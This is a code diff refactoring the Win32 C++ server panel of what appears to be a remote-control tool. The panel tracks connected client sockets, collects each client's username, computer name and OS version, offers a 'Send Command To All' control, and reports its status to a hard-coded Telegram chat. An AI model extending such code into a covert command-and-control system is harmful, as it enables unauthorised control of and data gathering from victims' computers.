@@ -7,26 +7,26 @@
 #include "codepoints.h"
 #include "countrycoords.h"
 #include <set>
-#define MAX_DOTS 100
-
-#pragma warning(disable:28251)
-
-#define WM_SOCKET WM_USER + 1
-#define GWL_HICON (-14)
-
-int counter;
-
-BOOL ishwndClient = false;
-BOOL ishwndFTP = false;
-static HWND hwndClient = NULL;
-static HWND hwndFTP = NULL;
-UINT_PTR timerId;
 
 HWND hwndList;
 HWND hwndButton;
+static HWND hwndClient = NULL;
+static HWND hwndFTP = NULL;
+BOOL ishwndClient = false;
+BOOL ishwndFTP = false;
 UINT selectedMenuItem;
+UINT_PTR timerId;
 int itemIndex;
+int g_itemIndex = -1;
+int counter;
 
+std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
+wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
+std::string response2;
+std::string fIPStr;
+std::string response;
+std::wstring osVersion;
+std::string pcUsername;
 std::wstring aCounter;
 std::wstring itemFileName;
 std::map<int, std::wstring> clientItems;
@@ -53,37 +53,6 @@ size_t writeFunction(void* ptr, size_t size, size_t nmemb, std::string* data) {
     return size * nmemb;
 }
 
-void OnCreate(HWND hwnd, WPARAM wParam, LPARAM lParam)
-{
-    HWND input = CreateWindowW(
-        L"EDIT",
-        L"cmd: dir",
-        WS_CHILD | WS_VISIBLE | WS_BORDER,
-        535,
-        350, 
-        200,
-        50,
-        hwnd,
-        (HMENU)14,
-        GetModuleHandle(NULL),
-        NULL 
-    );
-
-    HWND hwndButton = CreateWindowW(
-        L"BUTTON",
-        L"Send Command To All",
-        WS_CHILD | WS_VISIBLE,
-        750,
-        350,
-        150,
-        50,
-        hwnd,
-        (HMENU)15,
-        GetModuleHandle(NULL),
-        NULL 
-    );
-
-}
 
 int ListenOnPort(HWND hwnd, int portno)
 {
@@ -223,13 +192,13 @@ void TelegramServerStatus(boolean online)
     std::string acPoint = "chat_id=-893691554&text=";
     std::string txtmsg_chars;
 
-    if (online == true)
-    {
-        txtmsg_chars = acPoint + "[" + greendotEmoji + "]" + " SERVER ONLINE " + "[" + greendotEmoji + "]";
-    }
-    else if (online == false)
+    if (!online)
     {
         txtmsg_chars = acPoint + "[" + reddotEmoji + "]" + " SERVER CLOSED | OFFLINE " + "[" + reddotEmoji + "]";
+    }
+    else
+    {
+        txtmsg_chars = acPoint + "[" + greendotEmoji + "]" + " SERVER ONLINE " + "[" + greendotEmoji + "]";
     }
     
     const char* txtmsg_char = txtmsg_chars.c_str();
@@ -321,35 +290,6 @@ std::wstring GetCurrentSocketFromVector()
     return aCounter;
 }
 
-ATOM CreateColumn(HWND hwndLV, int iCol, int width, wchar_t table_txt[])
-{
-    LVCOLUMN lvc;
-
-    lvc.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT | LVCF_SUBITEM;
-    lvc.fmt = LVCFMT_LEFT;
-    lvc.cx = width;
-    lvc.pszText = table_txt;
-    lvc.iSubItem = iCol;
-
-    return ListView_InsertColumn(hwndLV, iCol, &lvc);
-};
-
-ATOM CreateItem(HWND hwndList, wchar_t column_txt[])
-{
-    LVITEM lvi = { 0 };
-
-    lvi.mask = LVIF_TEXT;
-    lvi.pszText = column_txt;
-    lvi.state = LVIS_SELECTED;
-    lvi.stateMask = LVIS_SELECTED;
-
-    SendMessageW(hwndList, LVM_SETITEMSTATE, 0, (LPARAM)&lvi);
-    SendMessageW(hwndList, LVM_SETTEXTCOLOR, (WPARAM)0, (LPARAM)RGB(122, 5, 5));
-
-    return ListView_InsertItem(hwndList, &lvi);
-}
-
-std::string pcUsername;
 
 void RequestUsername(HWND hwnd,int timerId)
 {
@@ -359,18 +299,6 @@ void RequestUsername(HWND hwnd,int timerId)
 
     SetTimer(hwnd, timerId, 100, NULL);
 }
-
-void TelegramInfo(HWND hwnd)
-{
-    SetTimer(hwnd, 1086, 1000, NULL);
-}
-
-std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
-std::string response2;
-std::string fIPStr;
-std::string response;
-wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
-std::wstring osVersion;
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
@@ -415,6 +343,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
                 SendMessageW(hwndList, LVM_SETTEXTCOLOR, (WPARAM)0, (LPARAM)RGB(122, 5, 5));
                 int itemIndex = ListView_InsertItem(hwndList, &item);
+                g_itemIndex = itemIndex;
                 clientItems.insert(std::make_pair(counter, thisItemName));
 
                 //OS
@@ -688,7 +617,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         }
         if (wParam == 1091)
         {
-            SOCKET selectedSocket = clientSockets[itemIndex];
+            SOCKET selectedSocket = clientSockets[g_itemIndex];
             char buffer[1024];
             int bytesReceived = recv(selectedSocket, buffer, sizeof(buffer), 0);
             if (bytesReceived > 0)
